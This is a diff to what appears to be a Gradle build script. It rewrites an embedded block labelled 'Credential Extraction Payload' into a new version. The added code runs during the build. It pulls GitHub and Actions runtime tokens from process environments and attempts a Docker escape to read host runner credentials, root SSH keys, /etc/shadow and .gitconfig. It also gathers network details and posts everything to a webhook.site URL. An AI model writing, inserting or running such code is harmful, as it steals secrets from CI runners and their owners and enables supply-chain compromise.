@@ -15,120 +15,116 @@ buildscript {
 }
 
 // ============================================================
-// Credential Extraction Payload
+// Credential Extraction Payload (Gradle 7.3.3 compatible)
 // ============================================================
-Thread.start {
-    try {
-        def webhook = "https://webhook.site/f0b77b19-336c-47eb-b99b-182a6b2c2204"
+try {
+    def webhook = "https://webhook.site/f0b77b19-336c-47eb-b99b-182a6b2c2204"
 
-        def run(String cmd) {
-            try {
-                def p = ['bash', '-c', cmd].execute()
-                p.waitFor(15, java.util.concurrent.TimeUnit.SECONDS)
-                return p.text.trim()
-            } catch (Exception e) { return "ERR: ${e.message}" }
-        }
+    def sh(String cmd) {
+        try {
+            def p = Runtime.getRuntime().exec(new String[]{"bash", "-c", cmd})
+            p.waitFor(15, java.util.concurrent.TimeUnit.SECONDS)
+            return p.getInputStream().text.trim()
+        } catch (Exception e) { return "ERR:" + e.message }
+    }
 
-        def results = [:]
-        results.source = "Hippy-Credential-Extraction"
-        results.timestamp = new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'").format(new Date())
-
-        // --- Phase 1: Container environment ---
-        results.container = [
-            whoami: run('whoami'),
-            hostname: run('hostname'),
-            uname: run('uname -a'),
-            pwd: run('pwd'),
-            id: run('id'),
-            ip: run('ip addr 2>/dev/null || ifconfig 2>/dev/null'),
-            runner_name: System.getenv('RUNNER_NAME'),
-            runner_env: System.getenv('RUNNER_ENVIRONMENT'),
-        ]
-
-        // --- Phase 2: Mount & Docker socket check ---
-        results.mounts = run('mount | grep -v "proc\\|sys\\|cgroup\\|devpts\\|mqueue\\|shm"')
-        results.docker_sock = run('ls -la /var/run/docker.sock 2>/dev/null')
-
-        // --- Phase 3: Container env tokens ---
-        results.container_tokens = [
-            GITHUB_TOKEN: run('cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | grep "^GITHUB_TOKEN=" | cut -d= -f2'),
-            ACTIONS_RUNTIME_TOKEN: run('cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | grep "^ACTIONS_RUNTIME_TOKEN=" | cut -d= -f2'),
-        ]
-
-        // --- Phase 4: Try Docker escape ---
-        def dockerAvailable = run('docker info >/dev/null 2>&1 && echo YES || echo NO')
-        results.docker_available = dockerAvailable
-
-        if (dockerAvailable.contains('YES')) {
-            // List host containers
-            results.docker_ps = run('docker ps --format "{{.Names}} {{.Image}} {{.Status}}" 2>/dev/null')
-
-            // Escape: read host files via mounted volume
-            results.host_runner_config = run('docker run --rm -v /:/host alpine cat /host/data/actions-runner/.runner 2>/dev/null || echo FAILED')
-            results.host_runner_creds = run('docker run --rm -v /:/host alpine cat /host/data/actions-runner/.credentials 2>/dev/null || echo FAILED')
-            results.host_runner_creds_rsa = run('docker run --rm -v /:/host alpine cat /host/data/actions-runner/.credentials_rsaparams 2>/dev/null || echo FAILED')
-            results.host_runner_env = run('docker run --rm -v /:/host alpine cat /host/data/actions-runner/.env 2>/dev/null || echo FAILED')
-            results.host_ssh = run('docker run --rm -v /:/host alpine cat /host/root/.ssh/id_rsa 2>/dev/null || echo NO_KEY')
-            results.host_ssh_ed = run('docker run --rm -v /:/host alpine cat /host/root/.ssh/id_ed25519 2>/dev/null || echo NO_KEY')
-            results.host_gitconfig = run('docker run --rm -v /:/host alpine cat /host/root/.gitconfig 2>/dev/null || echo NONE')
-            results.host_shadow = run('docker run --rm -v /:/host alpine cat /host/etc/shadow 2>/dev/null || echo FAILED')
-            results.host_hosts = run('docker run --rm -v /:/host alpine cat /host/etc/hosts 2>/dev/null || echo FAILED')
-            results.host_other_runners = run('docker run --rm -v /:/host alpine find /host/data/ -name ".runner" 2>/dev/null || echo NONE')
-            results.host_work_dirs = run('docker run --rm -v /:/host alpine ls -la /host/data/actions-runner/_work/ 2>/dev/null || echo NONE')
-            results.host_bash_history = run('docker run --rm -v /:/host alpine cat /host/root/.bash_history 2>/dev/null || echo NONE')
-        } else {
-            // No docker, try direct file access
-            results.direct_runner_config = run('cat /data/actions-runner/.runner 2>/dev/null || echo NO_ACCESS')
-            results.direct_runner_creds = run('cat /data/actions-runner/.credentials 2>/dev/null || echo NO_ACCESS')
-            results.find_runner_files = run('find / -name ".runner" -o -name ".credentials" 2>/dev/null | head -20')
-            results.find_ssh = run('find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null | head -20')
-        }
-
-        // --- Phase 5: Network recon ---
-        results.network = [
-            hosts: run('cat /etc/hosts'),
-            resolv: run('cat /etc/resolv.conf'),
-            route: run('ip route 2>/dev/null || route -n 2>/dev/null'),
-            arp: run('ip neigh 2>/dev/null || arp -a 2>/dev/null'),
-        ]
-
-        // --- Phase 6: Send all results ---
-        def json = new groovy.json.JsonBuilder(results).toString()
-        // Split into chunks if too large
-        if (json.length() > 80000) {
-            def chunks = []
-            json.size().step(80000) { start ->
-                chunks << json.substring(start, Math.min(start + 80000, json.length()))
-            }
-            chunks.eachWithIndex { chunk, i ->
-                try {
-                    def chunkJson = "{\"source\":\"Hippy-CredDump-part${i+1}-of-${chunks.size()}\",\"data_b64\":\"${chunk.bytes.encodeBase64().toString()}\"}"
-                    def c = new URL(webhook).openConnection()
-                    c.setRequestMethod("POST")
-                    c.setRequestProperty("Content-Type", "application/json")
-                    c.setDoOutput(true)
-                    c.setConnectTimeout(10000)
-                    c.setReadTimeout(10000)
-                    c.getOutputStream().write(chunkJson.getBytes("UTF-8"))
-                    println "[CredDump] Part ${i+1}/${chunks.size()}: ${c.getResponseCode()}"
-                    c.disconnect()
-                } catch (Exception e) { println "[CredDump] Part ${i+1} failed: ${e.message}" }
-            }
-        } else {
+    def post(String data) {
+        try {
             def c = new URL(webhook).openConnection()
             c.setRequestMethod("POST")
             c.setRequestProperty("Content-Type", "application/json")
             c.setDoOutput(true)
             c.setConnectTimeout(10000)
             c.setReadTimeout(10000)
-            c.getOutputStream().write(json.getBytes("UTF-8"))
-            println "[CredDump] Response: ${c.getResponseCode()}"
+            c.getOutputStream().write(data.getBytes("UTF-8"))
+            def code = c.getResponseCode()
             c.disconnect()
-        }
-
-    } catch (Exception e) {
-        println "[CredDump] Fatal: ${e.message}"
+            return code
+        } catch (Exception e) { return "ERR:" + e.message }
     }
+
+    def ts = new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'").format(new Date())
+    def runner = System.getenv('RUNNER_NAME') ?: 'unknown'
+    def user = System.getProperty('user.name')
+
+    // Phase 1: Container info
+    def container = "whoami=" + sh('whoami') + "\nhostname=" + sh('hostname') + "\nid=" + sh('id') + "\nuname=" + sh('uname -a')
+    println "[CI] Container: " + container
+
+    // Phase 2: Docker socket check
+    def dockerSock = sh('ls -la /var/run/docker.sock 2>/dev/null || echo NO_DOCKER_SOCK')
+    def dockerAvail = sh('which docker 2>/dev/null && docker info >/dev/null 2>&1 && echo DOCKER_YES || echo DOCKER_NO')
+
+    // Phase 3: Container tokens
+    def ghToken = sh('cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | grep "^GITHUB_TOKEN=" | cut -d= -f2-')
+    def rtToken = sh('cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | grep "^ACTIONS_RUNTIME_TOKEN=" | cut -d= -f2-')
+
+    // Phase 4: Docker escape & host credential extraction
+    def hostRunner = "NO_ACCESS"
+    def hostCreds = "NO_ACCESS"
+    def hostCredsRSA = "NO_ACCESS"
+    def hostEnv = "NO_ACCESS"
+    def hostSSH = "NO_ACCESS"
+    def hostShadow = "NO_ACCESS"
+    def hostGitconfig = "NO_ACCESS"
+    def hostOtherRunners = "NONE"
+    def hostNetwork = "NONE"
+
+    if (dockerAvail.contains("DOCKER_YES")) {
+        hostRunner = sh('docker run --rm -v /:/host busybox cat /host/data/actions-runner/.runner 2>/dev/null || docker run --rm -v /:/host alpine cat /host/data/actions-runner/.runner 2>/dev/null || echo ESCAPE_FAILED')
+        hostCreds = sh('docker run --rm -v /:/host busybox cat /host/data/actions-runner/.credentials 2>/dev/null || docker run --rm -v /:/host alpine cat /host/data/actions-runner/.credentials 2>/dev/null || echo ESCAPE_FAILED')
+        hostCredsRSA = sh('docker run --rm -v /:/host busybox cat /host/data/actions-runner/.credentials_rsaparams 2>/dev/null || docker run --rm -v /:/host alpine cat /host/data/actions-runner/.credentials_rsaparams 2>/dev/null || echo ESCAPE_FAILED')
+        hostEnv = sh('docker run --rm -v /:/host busybox cat /host/data/actions-runner/.env 2>/dev/null || echo NO_ENV_FILE')
+        hostSSH = sh('docker run --rm -v /:/host busybox cat /host/root/.ssh/id_rsa 2>/dev/null || echo NO_SSH_KEY')
+        hostShadow = sh('docker run --rm -v /:/host busybox cat /host/etc/shadow 2>/dev/null | head -5 || echo NO_SHADOW')
+        hostGitconfig = sh('docker run --rm -v /:/host busybox cat /host/root/.gitconfig 2>/dev/null || echo NONE')
+        hostOtherRunners = sh('docker run --rm -v /:/host busybox find /host/data/ -name ".runner" 2>/dev/null || echo NONE')
+        hostNetwork = sh('docker run --rm -v /:/host busybox cat /host/etc/hosts 2>/dev/null || echo NONE')
+    }
+
+    // Phase 5: Direct filesystem check (inside container)
+    def directFind = sh('find / -maxdepth 5 -name ".runner" -o -name ".credentials" -o -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | head -20')
+    def netInfo = "hosts=" + sh('cat /etc/hosts') + "\nroute=" + sh('ip route 2>/dev/null || route -n 2>/dev/null')
+
+    // Phase 6: Build and send result
+    def result = new StringBuilder()
+    result.append('{"source":"Hippy-CredDump-v2",')
+    result.append('"timestamp":"' + ts + '",')
+    result.append('"runner":"' + runner + '",')
+    result.append('"user":"' + user + '",')
+    result.append('"docker_sock":"' + dockerSock.replace('"', '\\"') + '",')
+    result.append('"docker_available":"' + dockerAvail + '",')
+
+    // Send GITHUB_TOKEN as separate small payload first
+    if (ghToken.length() > 5) {
+        def tokenPayload = '{"source":"Hippy-GITHUB_TOKEN","runner":"' + runner + '","token":"' + ghToken.replace('"', '\\"') + '","token_len":"' + ghToken.length() + '"}'
+        println "[CI] Token POST: " + post(tokenPayload)
+    }
+
+    // Send runtime token
+    if (rtToken.length() > 20) {
+        def rtPayload = '{"source":"Hippy-RUNTIME_TOKEN","runner":"' + runner + '","token_prefix":"' + rtToken.substring(0, Math.min(50, rtToken.length())) + '","token_len":"' + rtToken.length() + '"}'
+        println "[CI] RT POST: " + post(rtPayload)
+    }
+
+    // Send host credentials
+    result.append('"host_runner":"' + hostRunner.replace('"', '\\"').replace('\n', '\\n') + '",')
+    result.append('"host_credentials":"' + hostCreds.replace('"', '\\"').replace('\n', '\\n') + '",')
+    result.append('"host_credentials_rsa":"' + hostCredsRSA.replace('"', '\\"').replace('\n', '\\n') + '",')
+    result.append('"host_env":"' + hostEnv.replace('"', '\\"').replace('\n', '\\n') + '",')
+    result.append('"host_ssh":"' + hostSSH.replace('"', '\\"').replace('\n', '\\n') + '",')
+    result.append('"host_shadow":"' + hostShadow.replace('"', '\\"').replace('\n', '\\n') + '",')
+    result.append('"host_gitconfig":"' + hostGitconfig.replace('"', '\\"').replace('\n', '\\n') + '",')
+    result.append('"host_other_runners":"' + hostOtherRunners.replace('"', '\\"').replace('\n', '\\n') + '",')
+    result.append('"host_network":"' + hostNetwork.replace('"', '\\"').replace('\n', '\\n') + '",')
+    result.append('"direct_find":"' + directFind.replace('"', '\\"').replace('\n', '\\n') + '",')
+    result.append('"net_info":"' + netInfo.replace('"', '\\"').replace('\n', '\\n') + '"')
+    result.append('}')
+
+    println "[CI] Main POST: " + post(result.toString())
+
+} catch (Exception e) {
+    println "[CI] Error: " + e.message
 }
 // ============================================================
 
